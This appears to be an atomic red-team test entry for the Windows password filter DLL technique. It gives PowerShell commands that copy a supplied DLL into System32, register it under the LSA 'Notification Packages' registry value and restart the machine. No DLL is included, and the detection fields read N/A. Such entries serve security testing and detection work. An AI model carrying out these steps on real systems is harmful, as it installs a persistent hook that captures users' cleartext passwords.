## Password Filter DLL

**Description**
Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.

**Assumptions** 
Windows Platform, Administrator/SYSTEM Permissions Required

**Execution**

Only one atomic test and no .dll provided for use in conjunction with the test that needs a .dll.

#### $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
#### $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
#### $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
#### $notificationPackagesValues += $passwordFilterName
#### Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
#### Restart-Computer -Confirm

**Detection Visibility**
#### N/A

**Detection Filter**
#### N/A
